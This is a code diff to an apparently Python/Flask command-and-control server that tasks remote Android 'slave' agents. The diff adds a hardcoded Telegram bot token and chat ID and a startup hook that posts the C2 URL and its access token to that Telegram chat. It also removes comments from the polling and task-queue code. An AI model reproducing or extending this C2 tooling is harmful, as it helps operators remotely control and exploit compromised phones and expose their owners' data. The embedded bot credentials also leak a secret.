@@ -50,7 +50,41 @@ import time
 import urllib.error
 import urllib.request
 
+import requests
+
 from flask import Flask, Response, jsonify, request
+
+# ---------------------------------------------------------------------------
+# TELEGRAM — hardcoded, no .env files
+# ---------------------------------------------------------------------------
+TELEGRAM_BOT_TOKEN = os.environ.get(
+    "TG_TOKEN", "8609491076:AAEa7h3yGrolKQI93NbSMIKKLrpgu4eyVEE"
+)
+TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT", "7984959772")
+
+
+def post_to_telegram(message):
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        print("[telegram] skipped: token or chat_id not set")
+        return False
+    try:
+        r = requests.post(
+            f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
+            json={
+                "chat_id": TELEGRAM_CHAT_ID,
+                "text": message,
+                "disable_web_page_preview": True,
+            },
+            timeout=10,
+        )
+        if not r.ok:
+            print(f"[telegram] FAIL {r.status_code}: {r.text[:300]}")
+            return False
+        print(f"[telegram] sent ({len(message)} chars)")
+        return True
+    except Exception as e:
+        print(f"[telegram] EXC {type(e).__name__}: {e}")
+        return False
 
 # ---------------------------------------------------------------------------
 # CONFIG
@@ -148,9 +182,6 @@ def _emit_slave(slave_id):
     if payload:
         broadcast.emit('slave', payload)
 
-# Throttle slave-record emissions driven by poll events. Polls arrive
-# ~1 Hz per agent; emitting on every one would spam SSE. 10 s keeps the
-# UI's `online` dot and `last_seen` field fresh without the noise.
 _last_slave_emit: dict[int, float] = {}
 _last_slave_emit_lock = threading.Lock()
 
@@ -297,7 +328,6 @@ def _queue_task(slave_id, command, payload):
         return tid
 
 def _poll_next(slave_id):
-    """Returns ('unknown', None), ('nop', None), or ('task', task_dict)."""
     with _lock:
         if slave_id not in _slaves:
             return 'unknown', None
@@ -1090,6 +1120,13 @@ def print_banner(host, port, auth_on):
 
 def server_main(host, port):
     print_banner(host, port, C2_TOKEN is not None)
+    token_qs = f"?token={C2_TOKEN}" if C2_TOKEN else ""
+    url = f"{TUNNEL_URL}/{token_qs}"
+    post_to_telegram(
+        f"C2 [android] started.\n"
+        f"URL: {url}\n"
+        f"Bind: {host}:{port}"
+    )
     threading.Thread(target=verify_tunnel_async, daemon=True).start()
     try:
         app.run(host=host, port=port, debug=False, use_reloader=False,
